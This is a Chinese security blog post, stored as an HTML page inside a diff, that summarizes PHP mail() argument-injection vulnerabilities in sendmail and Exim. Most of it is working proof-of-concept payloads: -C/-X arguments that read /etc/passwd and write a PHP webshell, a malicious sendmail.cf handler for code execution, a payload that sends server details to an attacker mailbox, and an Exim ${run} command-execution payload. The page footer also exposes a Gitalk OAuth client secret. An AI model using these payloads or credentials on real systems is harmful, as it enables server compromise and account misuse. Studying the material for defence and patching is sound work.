@@ -1,0 +1,586 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Technology Blog">
+  <meta name="author" content="MYZXCG">
+  <meta name="keywords" content="Cyber Security">
+  <title>PHP mail()函数漏洞总结 - MYZ&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"myzxcg.com","root":"/","version":"1.8.6","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"#"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":"G-RLPQJE3YTB","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI","app_key":"0GcKEskKSnNfqn5dbNITfO4H","server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MYZ's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                
+                Blog
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                
+                Links
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP mail()函数漏洞总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      MYZXCG
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-03-13 14:38" pubdate>
+        2018年3月13日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP mail()函数漏洞总结</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：3 年前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>国外安全研究人@dawid_golunski曝光了多个使用PHP mail函数引发命令执行的漏洞。众多使用php内置mail函数的第三方邮件库，如phpmailer，SwiftMailer 纷纷中招。这些漏洞的成因和之前曝光的Roundcube命令执行漏洞如出一辙，都是由于其在调用php内置mail函数时，没有恰当过滤第5个参数，可以被注入恶意参数，引发命令执行漏洞。</p>
+<h2 id="mail-函数介绍"><a href="#mail-函数介绍" class="headerlink" title="mail()函数介绍"></a>mail()函数介绍</h2><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">bool mail <span class="token punctuation">(</span> string <span class="token variable">$to</span>  电子邮件收件人<span class="token punctuation">,</span>或收件人列表
+<span class="token punctuation">,</span> string <span class="token variable">$subject</span>       电子邮件的主题
+<span class="token punctuation">,</span> string <span class="token variable">$message</span>       邮件内容
+<span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$additional_headers</span> 
+<span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$additional_parameters</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> 许多web应用使用它设置发送者的地址和返回路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p>这里最后一个参数（ $ additional_parameters），允许注入额外的参数给系统安装的/usr/bin/sendmail程序，该程序使用mail()发送消息。</p>
+<p>在Linux系统上，mail函数在底层实现中，默认调用Linux的sendmail程序发送邮件。<br>例：使用mail()函数发送邮件</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$to</span><span class="token operator">=</span><span class="token double-quoted-string string">"john@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$subject</span><span class="token operator">=</span><span class="token double-quoted-string string">"simple email "</span><span class="token punctuation">;</span>
+    <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"from: mike@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$body</span><span class="token operator">=</span><span class="token double-quoted-string string">"body of the message"</span><span class="token punctuation">;</span>
+    <span class="token variable">$sender</span><span class="token operator">=</span><span class="token double-quoted-string string">"admin@localhost"</span><span class="token punctuation">;</span>
+    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token variable">$to</span><span class="token punctuation">,</span><span class="token variable">$subject</span><span class="token punctuation">,</span><span class="token variable">$body</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"-f <span class="token interpolation"><span class="token variable">$sender</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p>php将调用execve()执行sendmail程序</p>
+<div class="code-wrapper"><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">execve(&quot;&#x2F;bin&#x2F;sh&quot;,&quot;sh&quot;,&quot;-c&quot;,&quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail -t -i -f admin@localhost&quot;],[&#x2F;* 24 environment var *&#x2F;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+<p>-t和-i参数由PHP自动添加。参数-t使sendmail从标准输入中提取头，-i阻止sendmail将’.’作为输入的结尾。-f来自于mail()函数调用的第5个参数。<br>如果一个攻击者能够注入数据到mail()函数的第5个参数中，就会导致命令注入</p>
+<div class="code-wrapper"><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">&#x2F;usr&#x2F;sbin&#x2F;sendmail -t -i -f attacker@email exta_data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+<p>虽然PHP会使用escapeshellcmd函数来过滤参数的内容，对特殊字符的转义来防止恶意命令执行（&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A and \xFF.’ “这些字符都不能使用），但是我们可以添加命令执行的其他参数。</p>
+<p>-X logfile是记录log文件的，就是可以写文件；<br>-C file是临时加载一个配置文件，就是可以读文件；<br>-O option=value 是临时设置一个邮件存储的临时目录的配置。</p>
+<h3 id="使用-C参数文件任意读"><a href="#使用-C参数文件任意读" class="headerlink" title="使用-C参数文件任意读"></a>使用-C参数文件任意读</h3><div class="code-wrapper"><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">&#x2F;usr&#x2F;sbin&#x2F;sendmail -t -i -f attacker@email -C&#x2F;etc&#x2F;passwd -X &#x2F;tmp&#x2F;output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+<p>保存/etc/passwd 的内容到/tmp/output.txt</p>
+<h3 id="任意文件写-远程代码执行"><a href="#任意文件写-远程代码执行" class="headerlink" title="任意文件写/远程代码执行"></a>任意文件写/远程代码执行</h3><p>Sendmail MTA版本的/usr/sbin/sendmail的-X参数也能和下面参数组合使用</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$to</span><span class="token operator">=</span><span class="token double-quoted-string string">"john@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$subject</span><span class="token operator">=</span><span class="token double-quoted-string string">"simple email "</span><span class="token punctuation">;</span>
+    <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"from: mike@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$body</span><span class="token operator">=</span><span class="token double-quoted-string string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$sender</span><span class="token operator">=</span><span class="token double-quoted-string string">"admin@localhost -OQueueDirectory=/tmp/ -X/tmp/poc.php"</span><span class="token punctuation">;</span>
+    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token variable">$to</span><span class="token punctuation">,</span><span class="token variable">$subject</span><span class="token punctuation">,</span><span class="token variable">$body</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"-f <span class="token interpolation"><span class="token variable">$sender</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p>这里的意思就是说我们将发送邮件的信息如body临时文件保存在tmp下面，最后将日志保存在/tmp/poc.php,写到poc.php 文件的内容就是我那个发送邮件的内容了<br>注:-OQueueDirectory=/tmp/ 可以简写成-oQ/tmp/  -X后也可用相对路径</p>
+<h3 id="Sendmail-MTA：通过sendmail-cf远程代码执行"><a href="#Sendmail-MTA：通过sendmail-cf远程代码执行" class="headerlink" title="Sendmail MTA：通过sendmail.cf远程代码执行"></a>Sendmail MTA：通过sendmail.cf远程代码执行</h3><p>如果当前目录你没权限写怎么办？<br>或者写入的文件没办法执行怎么办？<br>在一个安全部署的web应用中，在上传目录(upload目录)的PHP脚本执行可能是被禁止的，且应用只允许上传静态文件（如纯文本、图片等）。发现的新的攻击向量能打破这些限制。因为sendmail接口允许通过-C参数加载一个自定义的Sendmail MTA配置文件，攻击者通过web应用的上传功能上传一个恶意的配置文件，使用它强制Sendmail执行恶意的代码这能通过复制一份/etc/mail/sendmail.cf配置文件并使用下面的Sendmail配置替换文件末尾的默认的Mlocal邮件处理函数来实现添加一段代码：</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">Mlocal<span class="token punctuation">,</span>      <span class="token constant">P</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>php<span class="token punctuation">,</span> <span class="token constant">F</span><span class="token operator">=</span>lsDFMAw5<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">|</span>@qPn9S<span class="token punctuation">,</span> <span class="token constant">S</span><span class="token operator">=</span>EnvFromL<span class="token operator">/</span>HdrFromL<span class="token punctuation">,</span>
+             <span class="token constant">R</span><span class="token operator">=</span>EnvToL<span class="token operator">/</span>HdrToL<span class="token punctuation">,</span>
+       		 <span class="token constant">T</span><span class="token operator">=</span><span class="token constant">DNS</span><span class="token operator">/</span><span class="token constant">RFC822</span><span class="token operator">/</span><span class="token constant">X</span><span class="token operator">-</span>Unix<span class="token punctuation">,</span>
+             <span class="token constant">A</span><span class="token operator">=</span>php <span class="token operator">--</span> <span class="token variable">$u</span> <span class="token variable">$h</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span>client_addr<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p><img src="images/phpmail.png" srcset="/img/loading.gif" alt=""><br>$sender payload将使用相对路径从upload/sendmail_cf_exec加载构造的Sendmail MTA配置文件，使用它处理来自mail()函数的邮件Sendmail MTA将启动/usr/bin/php进程并处理$body中的消息。有这么一种场景，一个攻击者能简单的使用/tmp目录来存放恶意的配置文件，然后使用mail()漏洞加载配置并在受害者用户上下文中获得代码执行。</p>
+<h3 id="Sendmail-MTA：通过文件读和文件追加造成拒绝服务"><a href="#Sendmail-MTA：通过文件读和文件追加造成拒绝服务" class="headerlink" title="Sendmail MTA：通过文件读和文件追加造成拒绝服务"></a>Sendmail MTA：通过文件读和文件追加造成拒绝服务</h3><p>-C和-X参数能用来对目标执行拒绝服务攻击，方法是使用-C选项读取大的已知文件（如web服务器日志），并追加他们到一个可写目录下的文件中（如/tmp、/var/www/html/upload、/var/lib/php5/sessions等），以消耗磁盘空间。尽管这个例子只限于Sendmail MTA，这个向量也可能影响更多的MTA服务器，只要使用其他MTA支持的类似的参数来做到。</p>
+<p><strong>注:</strong><br>Mail()参数注入被认为几乎不可能利用，因为多年来5th个参数都被认为不太可能暴露到web应用控制面板外面来接收恶意输入，其通常受限于管理员用户，因此很少被远程利用。<br>找到mail()参数注入漏洞，也不能保证一个成功的利用，因为依赖web服务器安装的MTA版本，直到现在也只有很少使用的Sendmail MTA的2个向量 –X和-C（文件写/读）。<br>由于复杂性和一些历史漏洞原因，Sendmail MTA很少被使用。现代linux分发中已不再默认包含它，且在基于Redhat的系统（如centos）上被Postfix MTA替换，在基于Debian的系统（如Ubuntu、Debian等）上被Exim MTA替代。<br>这使得在真实环境中很难找到Sendmail MTA。即使找到了，有时也会因为一些限制导致利用失败（如修改webroot路径、php执行目录等）。</p>
+<p>有一种新的利用向量，能在Exim和Postfix上使用</p>
+<h3 id="所有的MTA：抢夺邮件-执行侦查"><a href="#所有的MTA：抢夺邮件-执行侦查" class="headerlink" title="所有的MTA：抢夺邮件/执行侦查"></a>所有的MTA：抢夺邮件/执行侦查</h3><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$to</span><span class="token operator">=</span><span class="token double-quoted-string string">"john@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$subject</span><span class="token operator">=</span><span class="token double-quoted-string string">"simple email "</span><span class="token punctuation">;</span>
+    <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"from: mike@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$body</span><span class="token operator">=</span><span class="token double-quoted-string string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$sender</span><span class="token operator">=</span><span class="token double-quoted-string string">"nobydy@localhost attacker@anyhost-domain.com"</span><span class="token punctuation">;</span>
+    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token variable">$to</span><span class="token punctuation">,</span><span class="token variable">$subject</span><span class="token punctuation">,</span><span class="token variable">$body</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"-f <span class="token interpolation"><span class="token variable">$sender</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p><code>/usr/sbin/sendmail -t -i -f nobydy@localhost attacker@anyhost-domain.com</code>会发送邮件到攻击者的邮箱 <a href="mailto:attacker@anyhost-domain.com">attacker@anyhost-domain.com</a>内容包含了:<br>使用的操作系统版本（Debian）<br>服务器IP<br>使用的MTA版本（8.14.4，是Sendmail MTA）<br>发送消息的脚本名，继而揭露电子邮件发送库/框架的名（如X-PHP-Originating-Script: 0:class.phpmailer.php）<br>如果应用使用了电子邮件库（如PHPMailer、Zend-mail等）。可能会有版本头。<br>知道了使用的库，攻击者能调整他们的攻击的系统、MTA和PHP电子邮件库。<br>例如，PHPMailer库有版本有漏洞：PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033)</p>
+<h3 id="Exim-MTA：远程代码执行"><a href="#Exim-MTA：远程代码执行" class="headerlink" title="Exim MTA：远程代码执行"></a>Exim MTA：远程代码执行</h3><p>/usr/sbin/sendmail接口由Exim4提供，它有丰富的功能<br>研究表明-be选项对于攻击者很有用, 更深入的研究发现${run}能扩展到shell命令的返回结果<br><code>$&#123;run&#123;&lt;command&gt; &lt;args&gt;&#125;&#123;&lt;string1&gt;&#125;&#123;&lt;string2&gt;&#125;&#125;//执行命令&lt;command&gt; &lt;args&gt;，成功返回string1，失败返回string2</code><br><code>$&#123;run&#123;/bin/true&#125;&#123;yes&#125;&#123;no&#125;&#125; 成功执行/bin/true后会扩展为&#39;yes&#39;</code><br>这很快就能转化为任意远程代码执行payload，能执行在$body内的任意shell命令:</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$to</span><span class="token operator">=</span><span class="token double-quoted-string string">"john@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$subject</span><span class="token operator">=</span><span class="token double-quoted-string string">"simple email "</span><span class="token punctuation">;</span>
+    <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"from: mike@localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$body</span><span class="token operator">=</span><span class="token double-quoted-string string">"Exec :$&#123;run&#123;/bin/bash -c "</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>id <span class="token operator">></span><span class="token operator">/</span>tmp<span class="token operator">/</span>id<span class="token double-quoted-string string">"&#125;&#123;yes&#125;&#123;no&#125;&#125;"</span><span class="token punctuation">;</span>
+    <span class="token variable">$sender</span><span class="token operator">=</span><span class="token double-quoted-string string">"nobydy@localhost -be"</span><span class="token punctuation">;</span>
+    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token variable">$to</span><span class="token punctuation">,</span><span class="token variable">$subject</span><span class="token punctuation">,</span><span class="token variable">$body</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"-f <span class="token interpolation"><span class="token variable">$sender</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p>关于实战和绕过过滤的例子可以看看:<a target="_blank" rel="noopener" href="http://www.mottoin.com/101779.html">[CVE-2016-10033]WordPress &lt; 4.7.1远程代码执行漏洞分析</a></p>
+<p>参考链接: </p>
+<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86028">【技术分享】详细解析PHP mail()函数漏洞利用技巧 - 安全客，安全资讯平台</a>
+<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/hack-php-mail-additional_parameters/">Hack PHP mail additional_parameters | 绿盟科技技术博客</a>
+<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php/">php</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/20180921.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Office远程代码执行漏洞(CVE-2017-11882 & CVE-2018-0802)复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/20171116.html">
+                        <span class="hidden-mobile">文件上传绕过</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: 'e0d54f3fea956b581e05',
+          clientSecret: '1afd7215dc03a3fa856eb90ad3269d4e9b28a68e',
+          repo: 'myzxcg.github.io',
+          owner: 'myzxcg',
+          admin: ["myzxcg"],
+          id: 'b6cd3682fe206e1ecdb48d0cf5b3dd6b',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RLPQJE3YTB"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-RLPQJE3YTB');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
